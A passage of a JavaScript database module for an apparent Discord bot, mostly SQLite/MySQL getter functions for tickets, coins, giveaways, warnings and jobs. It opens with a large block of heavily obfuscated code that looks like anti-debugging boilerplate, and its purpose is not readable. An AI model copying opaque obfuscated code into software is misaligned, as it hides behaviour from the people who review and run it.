return!![];}['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72'](_0x27418a['\x65'+'\x75'+'\x4d'+'\x54'+'\x4c'](_0x27418a['\x63'+'\x6c'+'\x62'+'\x47'+'\x52'],_0x27418a['\x44'+'\x68'+'\x6d'+'\x4f'+'\x6b']))['\x63'+'\x61'+'\x6c'+'\x6c'](_0x27418a['\x72'+'\x66'+'\x44'+'\x78'+'\x7a']));}else{if(_0x27418a['\x4b'+'\x61'+'\x4d'+'\x41'+'\x44'](_0x27418a['\x79'+'\x42'+'\x78'+'\x7a'+'\x6c'],_0x27418a['\x79'+'\x42'+'\x78'+'\x7a'+'\x6c']))(function(){if(_0x27418a['\x57'+'\x52'+'\x44'+'\x6e'+'\x45'](_0x27418a['\x61'+'\x42'+'\x6d'+'\x4b'+'\x77'],_0x27418a['\x61'+'\x42'+'\x6d'+'\x4b'+'\x77'])){var _0x2ec697=_0x2c7e8e?function(){if(_0x1af313){var _0x389add=_0x5ab1bd['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](_0x44ba58,arguments);return _0x4079e5=null,_0x389add;}}:function(){};return _0xbd3caa=![],_0x2ec697;}else return![];}['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72'](_0x27418a['\x65'+'\x75'+'\x4d'+'\x54'+'\x4c'](_0x27418a['\x63'+'\x6c'+'\x62'+'\x47'+'\x52'],_0x27418a['\x44'+'\x68'+'\x6d'+'\x4f'+'\x6b']))['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](_0x27418a['\x72'+'\x49'+'\x46'+'\x53'+'\x71']));else{if(_0x377f56){var _0x5e6869=_0x43bb35['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](_0x24c362,arguments);return _0x2c0892=null,_0x5e6869;}}}}else return _0x9bc27a['\x74'+'\x6f'+'\x53'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67']()['\x73'+'\x65'+'\x61'+'\x72'+'\x63'+'\x68'](_0x27418a['\x62'+'\x4f'+'\x44'+'\x63'+'\x52'])['\x74'+'\x6f'+'\x53'+'\x74'+'\x72'+'\x69'+'\x6e'+'\x67']()['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72'](_0x533fc6)['\x73'+'\x65'+'\x61'+'\x72'+'\x63'+'\x68'](_0x27418a['\x62'+'\x4f'+'\x44'+'\x63'+'\x52']);}_0x27418a['\x57'+'\x6f'+'\x48'+'\x4b'+'\x6a'](_0x2cfd37,++_0xa7d7a5);}else{var _0x33e341={'\x45\x6c\x64\x63\x6a':_0x4f875d['\x51'+'\x76'+'\x48'+'\x74'+'\x7a'],'\x72\x57\x50\x43\x68':_0x4f875d['\x42'+'\x6c'+'\x58'+'\x76'+'\x72'],'\x68\x74\x58\x44\x6a':function(_0x53ce67,_0x470987){return _0x4f875d['\x72'+'\x70'+'\x42'+'\x4d'+'\x46'](_0x53ce67,_0x470987);},'\x47\x57\x52\x61\x6c':_0x4f875d['\x44'+'\x79'+'\x74'+'\x66'+'\x47'],'\x7a\x46\x6e\x45\x59':function(_0x5a7422,_0x592283){return _0x4f875d['\x52'+'\x73'+'\x59'+'\x65'+'\x54'](_0x5a7422,_0x592283);},'\x6c\x74\x69\x41\x77':_0x4f875d['\x6c'+'\x65'+'\x73'+'\x75'+'\x68'],'\x49\x6a\x53\x46\x58':function(_0x5b1822,_0x3a3b7e){return _0x4f875d['\x6c'+'\x55'+'\x6d'+'\x52'+'\x77'](_0x5b1822,_0x3a3b7e);},'\x75\x78\x77\x75\x6f':_0x4f875d['\x71'+'\x51'+'\x4f'+'\x6e'+'\x61'],'\x61\x51\x6a\x61\x42':function(_0x129e08,_0x3bce7f){return _0x4f875d['\x72'+'\x70'+'\x42'+'\x4d'+'\x46'](_0x129e08,_0x3bce7f);},'\x73\x68\x42\x54\x6c':function(_0x49e04f){return _0x4f875d['\x77'+'\x6d'+'\x4e'+'\x46'+'\x43'](_0x49e04f);}};_0x4f875d['\x42'+'\x61'+'\x42'+'\x65'+'\x44'](_0x273cd4,this,function(){var _0x5310fb=new _0x4b6ebb(_0x33e341['\x45'+'\x6c'+'\x64'+'\x63'+'\x6a']),_0x50b312=new _0x4139fd(_0x33e341['\x72'+'\x57'+'\x50'+'\x43'+'\x68'],'\x69'),_0x1f27e1=_0x33e341['\x68'+'\x74'+'\x58'+'\x44'+'\x6a'](_0x6984fa,_0x33e341['\x47'+'\x57'+'\x52'+'\x61'+'\x6c']);!_0x5310fb['\x74'+'\x65'+'\x73'+'\x74'](_0x33e341['\x7a'+'\x46'+'\x6e'+'\x45'+'\x59'](_0x1f27e1,_0x33e341['\x6c'+'\x74'+'\x69'+'\x41'+'\x77']))||!_0x50b312['\x74'+'\x65'+'\x73'+'\x74'](_0x33e341['\x49'+'\x6a'+'\x53'+'\x46'+'\x58'](_0x1f27e1,_0x33e341['\x75'+'\x78'+'\x77'+'\x75'+'\x6f']))?_0x33e341['\x61'+'\x51'+'\x6a'+'\x61'+'\x42'](_0x1f27e1,'\x30'):_0x33e341['\x73'+'\x68'+'\x42'+'\x54'+'\x6c'](_0x3fab3e);})();}}try{if(_0x27418a['\x76'+'\x50'+'\x46'+'\x4a'+'\x55'](_0x27418a['\x41'+'\x56'+'\x58'+'\x7a'+'\x57'],_0x27418a['\x41'+'\x56'+'\x58'+'\x7a'+'\x57'])){if(_0x1aed05){if(_0x27418a['\x70'+'\x64'+'\x52'+'\x54'+'\x4d'](_0x27418a['\x45'+'\x51'+'\x6b'+'\x6d'+'\x69'],_0x27418a['\x56'+'\x50'+'\x66'+'\x75'+'\x70']))_0x550048=_0x27418a['\x62'+'\x6c'+'\x72'+'\x5a'+'\x75'](_0x5d0fac,_0x27418a['\x4f'+'\x4d'+'\x44'+'\x48'+'\x62'](_0x27418a['\x4f'+'\x4d'+'\x44'+'\x48'+'\x62'](_0x27418a['\x57'+'\x4e'+'\x51'+'\x77'+'\x79'],_0x27418a['\x67'+'\x47'+'\x44'+'\x71'+'\x4d']),'\x29'+'\x3b'))();else return _0x2cfd37;}else _0x27418a['\x57'+'\x52'+'\x44'+'\x6e'+'\x45'](_0x27418a['\x4a'+'\x6f'+'\x69'+'\x78'+'\x42'],_0x27418a['\x6c'+'\x52'+'\x76'+'\x6f'+'\x6d'])?_0x27418a['\x57'+'\x6f'+'\x48'+'\x4b'+'\x6a'](_0x2cfd37,-0x1e79+0x1*0x119+0x1d60):function(){return!![];}['\x63'+'\x6f'+'\x6e'+'\x73'+'\x74'+'\x72'+'\x75'+'\x63'+'\x74'+'\x6f'+'\x72'](_0x27418a['\x65'+'\x75'+'\x4d'+'\x54'+'\x4c'](_0x27418a['\x63'+'\x6c'+'\x62'+'\x47'+'\x52'],_0x27418a['\x44'+'\x68'+'\x6d'+'\x4f'+'\x6b']))['\x63'+'\x61'+'\x6c'+'\x6c'](_0x27418a['\x72'+'\x66'+'\x44'+'\x78'+'\x7a']);}else{var _0x130af9=_0x225295['\x61'+'\x70'+'\x70'+'\x6c'+'\x79'](_0x5d28c5,arguments);return _0x50d74e=null,_0x130af9;}}catch(_0x5ee174){}}
        });
    },
    get: {
        ticket_messages: {
            getMessages(ticket) {
                return new Promise((resolve, reject) => {
                    if (!ticket) {
                        if (module.exports.type === 'sqlite') {
                            resolve(module.exports.sqlite.database.prepare("SELECT * FROM ticketmessages").all());
                        }
                        if (module.exports.type === 'mysql') {
                            module.exports.mysql.database.query('SELECT * FROM ticketmessages', [], (err, messages) => {
                                if (err) reject(err);
                                resolve(messages);
                            });
                        }
                    } else {
                        if (module.exports.type === 'sqlite') {
                            resolve(module.exports.sqlite.database.prepare("SELECT * FROM ticketmessages WHERE ticket=?").all(ticket));
                        }
                        if (module.exports.type === 'mysql') {
                            module.exports.mysql.database.query('SELECT * FROM ticketmessages WHERE ticket=?', [ticket], (err, messages) => {
                                if (err) reject(err);
                                resolve(messages);
                            });
                        }
                    }
                });
            },
            getEmbedFields(messageID) {
                return new Promise((resolve, reject) => {
                    if (!messageID) return reject('[DATABASE (get.ticket_messages.getEmbedFields)] Invalid messageID');

                    if (module.exports.type === 'sqlite') {
                        resolve(module.exports.sqlite.database.prepare("SELECT * FROM ticketmessages_embed_fields WHERE message=?").all(messageID));
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM ticketmessages_embed_fields WHERE message=?', [messageID], (err, fields) => {
                            if (err) reject(err);
                            resolve(fields);
                        });
                    }
                });
            }
        },
        getTickets(id) {
            return new Promise((resolve, reject) => {
                if (id) {

                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM tickets WHERE channel_id=?").get(id));

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM tickets WHERE channel_id=?', [id], (err, tickets) => {
                        if (err) reject(err);
                        resolve(tickets[0]);
                    });
                } else {

                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM tickets").all());

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM tickets', (err, tickets) => {
                        if (err) reject(err);
                        resolve(tickets);
                    });
                }
            });
        },
        getAddedUsers(ticket) {
            return new Promise((resolve, reject) => {
                if (ticket) {
                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM ticketsaddedusers WHERE ticket=?").all(ticket));

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM ticketsaddedusers WHERE ticket=?', [ticket], (err, addedusers) => {
                        if (err) reject(err);
                        resolve(addedusers);
                    });
                } else {

                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM ticketsaddedusers").all());

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM ticketsaddedusers', (err, addedusers) => {
                        if (err) reject(err);
                        resolve(addedusers);
                    });
                }
            });
        },
        getStatus() {
            return new Promise((resolve, reject) => {
                // SQLITE
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM status").get());

                // MYSQL
                if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM status', (err, status) => {
                    if (err) reject(err);
                    resolve(status[0]);
                });
            });
        },
        getCoins(user) {
            return new Promise((resolve, reject) => {
                if (user) {
                    if (!user.guild) return reject('User is not a member.');

                    // SQLITE
                    if (module.exports.type === 'sqlite') {
                        const coins = module.exports.sqlite.database.prepare('SELECT * FROM coins WHERE user=? AND guild=?').get(user.id, user.guild.id);

                        if (!coins) {
                            module.exports.update.coins.updateCoins(user, 0, "set");
                            resolve(0);
                        } else resolve(coins.coins);
                    }

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM coins WHERE user=? AND guild=?', [user.id, user.guild.id], (err, coins) => {
                        if (err) reject(err);
                        if (coins.length < 1) {
                            module.exports.update.coins.updateCoins(user, 0, "set");
                            resolve(0);
                        }
                        else resolve(coins[0].coins);
                    });
                } else {

                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM coins").all());

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM coins', (err, coins) => {
                        if (err) reject(err);
                        resolve(coins);
                    });
                }
            });
        },
        getExperience(user) {
            return new Promise((resolve, reject) => {
                if (user) {
                    if (!user.guild) return reject('User is not a member.');

                    // SQLITE
                    if (module.exports.type === 'sqlite') {
                        const experience = module.exports.sqlite.database.prepare("SELECT * FROM experience WHERE user=? AND guild=?").get(user.id, user.guild.id);

                        if (!experience) {
                            module.exports.update.experience.updateExperience(user, 1, 0, 'set');
                            resolve({ level: 1, xp: 0 });
                        }
                        else resolve(experience);
                    }

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM experience WHERE user=? AND guild=?', [user.id, user.guild.id], (err, experience) => {
                        if (err) reject(err);
                        if (experience.length < 1) {
                            //module.exports.update.experience.updateExperience(user, 1, 0, 'set')
                            resolve({ level: 1, xp: 0 });
                        }
                        else resolve(experience[0]);
                    });
                } else {

                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM experience").all());

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM experience', (err, experience) => {
                        if (err) reject(err);
                        resolve(experience);
                    });
                }
            });
        },
        getFilter() {
            return new Promise((resolve, reject) => {

                // SQLITE
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM filter").all().map(w => w.word));

                // MYSQL
                if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM filter', (err, words) => {
                    if (err) reject(err);
                    resolve(words.map(w => w.word));
                });
            });
        },
        getGiveaways(messageID) {
            return new Promise((resolve, reject) => {
                if (messageID) {
                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM giveaways WHERE message=?").get(messageID));

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM giveaways WHERE message=?', [messageID], (err, giveaways) => {
                        if (err) reject(err);
                        resolve(giveaways[0]);
                    });
                } else {

                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM giveaways").all());

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM giveaways', (err, giveaways) => {
                        if (err) reject(err);
                        resolve(giveaways);
                    });
                }
            });
        },
        getGiveawayFromName(name) {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM giveaways WHERE prize=? LIMIT 1").get(name));

                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM giveaways WHERE prize=? LIMIT 1', [name], (err, giveaways) => {
                        if (err) reject(err);
                        return resolve(giveaways[0]);
                    });
                }
            });
        },
        getGiveawayFromID(id) {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM giveaways WHERE message=?").get(id));
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM giveaways WHERE message=? LIMIT 1', [id], (err, giveaways) => {
                        if (err) reject(err);
                        return resolve(giveaways[0]);
                    });
                }
            });
        },
        getLatestGiveaway() {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM giveaways ORDER BY start DESC LIMIT 1").get());
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM giveaways ORDER BY start DESC LIMIT 1', (err, giveaways) => {
                        if (err) reject(err);
                        return resolve(giveaways[0]);
                    });
                }
            });
        },
        getGiveawayReactions(id) {
            return new Promise((resolve, reject) => {
                if (id) {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM giveawayreactions WHERE giveaway=?").all(id));
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM giveawayreactions WHERE giveaway=?', [id], (err, reactions) => {
                            if (err) reject(err);
                            return resolve(reactions);
                        });
                    }
                } else {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare("SELECT * FROM giveawayreactions").all());
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM giveawayreactions', [], (err, reactions) => {
                            if (err) reject(err);
                            return resolve(reactions);
                        });
                    }
                }
            });
        },
        getGiveawayWinners(id) {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') resolve(JSON.parse(module.exports.sqlite.database.prepare("SELECT winners FROM giveaways WHERE message=?").get(id).winners));
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT winners FROM giveaways WHERE message=?', [id], (err, giveaways) => {
                        if (err) reject(err);
                        return resolve(JSON.parse(giveaways[0].winners));
                    });
                }
            });
        },
        getPrefixes(guildID) {
            return new Promise((resolve, reject) => {
                if (guildID) {

                    // SQLITE
                    if (module.exports.type === 'sqlite') {
                        let prefix = module.exports.sqlite.database.prepare('SELECT * FROM prefixes WHERE guild=?').get(guildID);

                        if (!prefix) {
                            resolve(Utils.variables.config.Prefix);
                            return module.exports.update.prefixes.updatePrefix(guildID, Utils.variables.config.Prefix);
                        }

                        resolve(prefix.prefix);
                    }

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM prefixes WHERE guild=?', [guildID], (err, prefixes) => {
                        if (err) reject(err);
                        if (prefixes.length < 1) {
                            resolve(Utils.variables.config.Prefix);
                            return module.exports.update.prefixes.updatePrefix(guildID, Utils.variables.config.Prefix);
                        }
                        resolve(prefixes[0].prefix);
                    });
                } else {

                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM prefixes').all());

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM prefixes', (err, prefixes) => {
                        if (err) reject(err);
                        resolve(prefixes);
                    });
                }
            });
        },
        getPunishments(id) {
            return new Promise((resolve, reject) => {
                if (id) {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM punishments WHERE id=?').get(id));
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM punishments WHERE id=?', [id], (err, rows) => {
                            if (err) reject(err);
                            else resolve(rows[0]);
                        });
                    }
                } else {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM punishments').all());
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM punishments', (err, rows) => {
                            if (err) reject(err);
                            else resolve(rows);
                        });
                    }
                }
            });
        },
        getPunishmentsForUser(user) {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM punishments WHERE user=?').all(user));
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM punishments WHERE user=?', [user], (err, rows) => {
                        if (err) reject(err);
                        else resolve(rows);
                    });
                }
            });
        },
        getPunishmentsForUserByTag(tag) {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM punishments WHERE tag=?').all(tag));
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM punishments WHERE tag=?', [tag], (err, rows) => {
                        if (err) reject(err);
                        else resolve(rows);
                    });
                }
            });
        },
        getPunishmentID() {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') resolve((module.exports.sqlite.database.prepare('SELECT id FROM punishments ORDER BY id DESC LIMIT 1').get() || { id: 1 }).id);
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT id FROM punishments ORDER BY id DESC LIMIT 1', (err, punishments) => {
                        if (err) return reject(err);
                        resolve((punishments[0] || { id: 1 }).id);
                    });
                }
            });
        },
        getWarnings(user) {
            return new Promise((resolve, reject) => {
                if (user && user.id) {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM warnings WHERE user=?').all(user.id));
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM warnings WHERE user=?', [user.id], (err, warnings) => {
                            if (err) reject(err);
                            else resolve(warnings);
                        });
                    }
                } else {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM warnings').all());
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM warnings', (err, warnings) => {
                            if (err) reject(err);
                            else resolve(warnings);
                        });
                    }
                }
            });
        },
        getWarningsFromUserByID(id) {
            return new Promise((resolve, reject) => {
                if (!id) return reject('[DATABASE (get.getWarningsFromUserByID)] Invalid inputs');
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM warnings WHERE user=?').all(id));
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM warnings WHERE user=?', [id], (err, warnings) => {
                        if (err) reject(err);
                        else resolve(warnings);
                    });
                }

            });
        },
        getWarning(id) {
            return new Promise((resolve, reject) => {
                if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM warnings WHERE id=?').get(id));
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM warnings WHERE id=?', [id], (err, warnings) => {
                        if (err) reject(err);
                        else resolve(warnings[0]);
                    });
                }
            });
        },
        getModules(modulename) {
            return new Promise((resolve, reject) => {
                if (modulename) {
                    if (module.exports.type === 'sqlite') {
                        const Module = module.exports.sqlite.database.prepare('SELECT * FROM modules WHERE name=?').get(modulename);
                        if (Module) {
                            resolve({ name: Module.name, enabled: !!Module.enabled });
                        } else {
                            resolve({ name: modulename, enabled: true });
                        }
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM modules WHERE name=?', [modulename], (err, rows) => {
                            if (err) reject(err);
                            else resolve(rows[0]);
                        });
                    }
                } else {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM modules').all().map(m => {
                        return {
                            name: m.name,
                            enabled: !!m.enabled
                        };
                    }));
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM modules', (err, rows) => {
                            if (err) reject(err);
                            resolve(rows);
                        });
                    }
                }
            });
        },
        getJobs(user) {
            return new Promise((resolve, reject) => {
                if (user) {
                    if (!user.guild) return reject('User is not a member.');

                    if (module.exports.type === 'sqlite') {
                        const job = module.exports.sqlite.database.prepare('SELECT * FROM jobs WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        let global = module.exports.sqlite.database.prepare('SELECT * FROM global_times_worked WHERE user=? AND guild=?').get(user.id, user.guild.id);

                        if (!job) resolve();

                        if (!global) {
                            global = {
                                times_worked: job.amount_of_times_worked
                            };

                            module.exports.sqlite.database.prepare('INSERT INTO global_times_worked(user, guild, times_worked) VALUES(?, ?, ?)').run(user.id, user.guild.id, job.amount_of_times_worked);
                        }


                        resolve({
                            user: job.user,
                            guild: job.guild,
                            job: job.job,
                            tier: job.tier,
                            nextWorkTime: job.next_work_time,
                            amountOfTimesWorked: job.amount_of_times_worked,
                            globalTimesWorked: global.times_worked
                        });
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM jobs WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (rows.length < 1) resolve(undefined);
                            else {
                                module.exports.mysql.database.query('SELECT * FROM global_times_worked WHERE user=? AND guild=?', [user.id, user.guild.id], (err, r) => {
                                    if (!r[0]) {
                                        r[0] = {
                                            times_worked: rows[0].amount_of_times_worked
                                        };

                                        module.exports.mysql.database.query('INSERT INTO global_times_worked(user, guild, times_worked) VALUES(?, ?, ?)', [user.id, user.guild.id, rows[0].amount_of_times_worked], () => { });
                                    }
                                    resolve({
                                        user: rows[0].user,
                                        guild: rows[0].guild,
                                        job: rows[0].job,
                                        tier: rows[0].tier,
                                        nextWorkTime: rows[0].next_work_time,
                                        amountOfTimesWorked: rows[0].amount_of_times_worked,
                                        globalTimesWorked: r[0].times_worked
                                    });
                                });
                            }
                        });
                    }
                } else {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM jobs').all().map(j => {
                        return {
                            user: j.user,
                            guild: j.guild,
                            job: j.job,
                            tier: j.tier,
                            nextWorkTime: j.next_work_time,
                            amountOfTimesWorked: j.amount_of_times_worked
                        };
                    }));
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM jobs', (err, rows) => {
                            if (err) reject(err);
                            rows = rows.map(r => {
                                return {
                                    user: r.user,
                                    guild: r.guild,
                                    job: r.job,
                                    tier: r.tier,
                                    nextWorkTime: r.next_work_time,
                                    amountOfTimesWorked: r.amount_of_times_worked
                                };
                            });
                            resolve(rows);
                        });
                    }
                }
            });
        },
        getWorkCooldowns(user) {
            return new Promise((resolve, reject) => {
                if (user) {
                    if (!user.guild) return reject('User is not a member.');

                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM job_cooldowns WHERE user=? AND guild=?').get(user.id, user.guild.id));
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM job_cooldowns WHERE user=? AND guild=?', [user.id, user.guild.id], (err, cooldowns) => {
                            if (err) reject(err);
                            if (cooldowns.length < 1) resolve(undefined);
                            else resolve(cooldowns[0]);
                        });
                    }
                } else {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM job_cooldowns').all());
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM job_cooldowns', (err, rows) => {
                            if (err) reject(err);
                            resolve(rows);
                        });
                    }
                }
            });
        },
        getDailyCoinsCooldown(user) {
            return new Promise((resolve, reject) => {
                if (user) {
                    if (!user.guild) return reject('User is not a member.');

                    if (module.exports.type === 'sqlite') {
                        const cooldown = module.exports.sqlite.database.prepare('SELECT * FROM dailycoinscooldown WHERE user=? AND guild=?').get(user.id, user.guild.id);
                        resolve(cooldown ? cooldown.date : undefined);
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM dailycoinscooldown WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {
                            if (err) reject(err);
                            if (rows.length < 1) resolve(undefined);
                            else resolve(rows[0].date);
                        });
                    }
                } else reject('User required');
            });
        },
        getGlobalTimesWorked(user) {
            return new Promise((resolve, reject) => {
                if (!user) reject("Invalid paramters in getGlobalTimesWorked");
                if (!user.guild) return reject('User is not a member.');

                if (module.exports.type === 'sqlite') {
                    let global = module.exports.sqlite.database.prepare('SELECT * FROM global_times_worked WHERE user=? AND guild=?').get(user.id, user.guild.id);

                    if (!global) module.exports.sqlite.database.prepare('INSERT INTO global_times_worked(user, guild, times_worked) VALUES(?, ?, ?)').run(user.id, user.guild.id, 0);

                    resolve(global ? global.times_worked : 0);
                }
                if (module.exports.type === 'mysql') {
                    module.exports.mysql.database.query('SELECT * FROM global_times_worked WHERE user=? AND guild=?', [user.id, user.guild.id], (err, rows) => {

                        if (!rows.length) module.exports.mysql.database.query('INSERT INTO global_times_worked(user, guild, times_worked) VALUES(?, ?, ?)', [user.id, user.guild.id, 0], () => { });

                        resolve(rows.length ? rows[0].times_worked : 0);
                    });
                }
            });
        },
        getCommands(commandname) {
            return new Promise((resolve, reject) => {
                if (commandname) {
                    if (module.exports.type === 'sqlite') {
                        const command = module.exports.sqlite.database.prepare('SELECT * FROM commands WHERE name=?').get(commandname);
                        if (!command) resolve();
                        else resolve({ name: command.name, enabled: !!command.enabled });
                    }
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM commands WHERE name=?', [commandname], (err, rows) => {
                            if (err) reject(err);
                            else resolve(rows[0]);
                        });
                    }
                } else {
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM commands').all().map(c => {
                        return {
                            name: c.name,
                            enabled: !!c.enabled
                        };
                    }));
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM commands', (err, rows) => {
                            if (err) reject(err);
                            resolve(rows);
                        });
                    }
                }
            });
        },
        getApplications(id) {
            return new Promise((resolve, reject) => {
                if (id) {
                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM applications WHERE channel_id=?').get(id));

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM applications WHERE channel_id=?', [id], (err, applications) => {
                        if (err) reject(err);
                        if (applications.length) applications[0].rank = applications[0]._rank;
                        resolve(applications.length ? applications[0] : undefined);
                    });
                } else {
                    // SQLITE
                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM applications').all());

                    // MYSQL
                    if (module.exports.type === 'mysql') module.exports.mysql.database.query('SELECT * FROM applications', (err, applications) => {
                        if (err) reject(err);
                        if (applications.length) applications = applications.map(app => {
                            app.rank = app._rank;
                            return app;
                        });
                        resolve(applications);
                    });
                }
            });
        },
        application_messages: {
            getMessages(application) {
                return new Promise((resolve, reject) => {
                    if (!application) return reject('Invalid application');

                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM applicationmessages WHERE application=?').all(application));
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM applicationmessages WHERE application=?', [application], (err, messages) => {
                            if (err) reject(err);
                            resolve(messages);
                        });
                    }
                });
            },
            getEmbedFields(messageID) {
                return new Promise((resolve, reject) => {
                    if (!messageID) return reject('Invalid messageID');

                    if (module.exports.type === 'sqlite') resolve(module.exports.sqlite.database.prepare('SELECT * FROM applicationmessages_embed_fields WHERE message=?').all(messageID));
                    if (module.exports.type === 'mysql') {
                        module.exports.mysql.database.query('SELECT * FROM applicationmessages_embed_fields WHERE message=?', [messageID], (err, fields) => {
                            if (err) reject(err);
                            resolve(fields);
                        });
                    }
                });
            }
        },
        getSavedRoles(user) {
